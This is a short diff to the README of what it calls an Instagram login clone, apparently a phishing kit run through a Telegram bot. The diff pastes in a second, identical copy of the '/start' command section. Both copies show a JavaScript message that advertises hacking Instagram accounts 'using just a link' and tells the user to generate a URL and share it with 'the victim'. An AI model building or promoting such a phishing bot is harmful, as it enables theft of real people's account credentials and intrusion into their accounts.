@@ -38,3 +38,8 @@ This repository contains the source code for an **Instagram Login Clone** design
 Welcomes the user and provides instructions on using the bot.
 ```javascript
 Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄: \n1. Send the /create command \n2. Share the generated URL with the victim.");
+
+#### `/start` Command
+Welcomes the user and provides instructions on using the bot.
+```javascript
+Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄: \n1. Send the /create command \n2. Share the generated URL with the victim.");
